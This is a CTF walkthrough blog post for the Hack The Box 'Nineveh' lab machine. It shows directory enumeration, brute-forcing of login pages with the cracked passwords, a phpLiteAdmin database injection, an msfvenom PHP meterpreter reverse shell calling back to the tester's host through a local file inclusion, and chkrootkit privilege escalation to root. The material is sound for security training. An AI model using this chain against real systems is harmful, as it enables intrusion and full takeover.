@@ -1,0 +1,403 @@
+
+								
+																		Hack The Box : Nineveh Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on June 27, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Nineveh” which is categories as retired lab presented by Hack the Box for making online penetration practices. 
+Level: Intermediate
+Task: find user.txt and root.txt file on the victim’s machine.
+Penetration Methodology
+Scanning
+
+Open port and running services (Nmap)
+
+Enumeration
+
+Enumerating Web Directories (Dirb)
+
+Exploiting
+
+Brute force on PHPliteAdmin (Burp Suite)
+Spawning Shell (Metasploit)
+Get user.txt
+
+Privilege Escalation
+
+User.txt
+
+Walk-Through
+Scanning
+Since these labs are online accessible therefore they have static IP. The IP of Nineveh is 10.10.10.43 so let’s initiate with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.43
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.43
+					
+				
+			
+		
+
+it enumerated port 80 and 443 are open.
+
+We explored port 80 but didn’t observe any remarkable clue for next step.
+
+Enumeration
+So next, we use the dirb tool of Kali to enumerate the directories and found some important directories such as http://10.10.10.43/department/  then went to the web browser to explore them.
+
+		
+		
+			
+			
+			
+			
+dirb http://10.10.10.43 /usr/share/wordlists/dirb/big.txt
+			
+				
+					
+				
+					1
+				
+						dirb http://10.10.10.43 /usr/share/wordlists/dirb/big.txt
+					
+				
+			
+		
+
+
+It put-up login page as shown here.
+
+So we try the random combination of username and password. While we have enter username: admin and Password: password it gave an error “Invalid Password” hence it was sure that the username must be the admin.
+
+Then with help of burp suit, we made brute force attack and use the rockyou.txt file as password dictionary. Thus we obtain the correct combination for login.
+
+		
+		
+			
+			
+			
+			
+Username: admin
+Password: 1q2w3e4r5t
+			
+				
+					
+				
+					12
+				
+						Username: adminPassword: 1q2w3e4r5t
+					
+				
+			
+		
+
+
+ 
+Used above credential for login and get into admin console as shown.
+
+At Notes tab we concluded that the given text of a file stored at someplace in the system entitled with ninevehNotes.txt.
+
+After that we also explored port 443 and observe the following web page. We also look at it view source but didn’t notice any further hint.
+
+Therefore again use dirb tool for directory brute force attack and observe the /db directory.
+
+		
+		
+			
+			
+			
+			
+dirb https://10.10.10.43 /usr/share/wordlists/dirb/big.txt
+			
+				
+					
+				
+					1
+				
+						dirb https://10.10.10.43 /usr/share/wordlists/dirb/big.txt
+					
+				
+			
+		
+
+
+Exploiting
+For a second time, we explored the above-enumerated directory and observe login page for phpliteAdmin v1.9.
+
+Again we lunch brute forced the password field on /db with burp suit and got the password: password123.
+
+By using password123 and we get inside the PHPLiteAdmin dashboard. Then with help of Google, we found the trick to exploit it after reading the description from exploit DB 24044.
+
+After reading the description from exploit 24044 then we create a new database “ninevehNotes.txt.shell.php”
+
+Here we have created a new table “Demo” and Add! Filed inside this.
+
+Now create an entry in filed 1 as shown.
+
+Let’s create a PHP payload for injecting inside the new database. We have to use the msfvenom command for generating PHP backdoor.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw
+					
+				
+			
+		
+
+Now copy the code from *&lt;?php….die(); and start multi handler in a new terminal
+
+GO to insert tab and Past above-copied code inside the text field given for Value.
+
+At last you will notice /var/tmp/ ninevehNotes.txt.shell.php is the Path for your database.
+
+If you remember, we had already access admin console and observed a tab for Notes, use it to execute your backdoor.
+
+		
+		
+			
+			
+			
+			
+http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.txt.shell.php
+			
+				
+					
+				
+					1
+				
+						http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.txt.shell.php
+					
+				
+			
+		
+
+
+Meanwhile, return to the Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.25
+msf exploit(multi/handler) set lport 4444
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.25msf exploit(multi/handler) set lport 4444msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe meterpreter session 1. But the task is not finished yet, still, we need to penetrate more for privilege escalation.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; sysinfo
+meterpreter &gt; cd /home
+meterpreter &gt; ls
+meterpreter &gt; cd amrois
+meterpreter &gt;ls
+meterpreter &gt; cat user.txt
+			
+				
+					
+				
+					123456
+				
+						meterpreter &gt; sysinfometerpreter &gt; cd /homemeterpreter &gt; lsmeterpreter &gt; cd amroismeterpreter &gt;lsmeterpreter &gt; cat user.txt
+					
+				
+			
+		
+
+
+Privilege Escalation 
+After doing a little bit enumeration we notice a directory report is owned by the user amrois and these reports were being continuously generated by chkrootkit in every minute.
+With help of Google, we came to know that Metasploit contains an exploit for chkrootkit exploitation. After entering following command as shown in the given image to load exploit/unix/local/chkrootkit module then set session 1 and arbitrary lport such as 4545 and run the module.
+This will give another session, as you can see we have spawned command shell of the target’s machine. Now if you will check uid by typing id it will show uid=0 as root.
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+			
+				
+					
+				
+					12
+				
+						idcd /root
+					
+				
+			
+		
+
+And to see the list of files in /root type:
+
+		
+		
+			
+			
+			
+			
+ls -lsa
+			
+				
+					
+				
+					1
+				
+						ls -lsa
+					
+				
+			
+		
+
+In the list you will see that there is a text file and read that file type :
+
+		
+		
+			
+			
+			
+			
+cat root.txt
+			
+				
+					
+				
+					1
+				
+						cat root.txt
+					
+				
+			
+		
+
+Congrats!! We hit Goal finished both tasks and at end obtain the root access.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
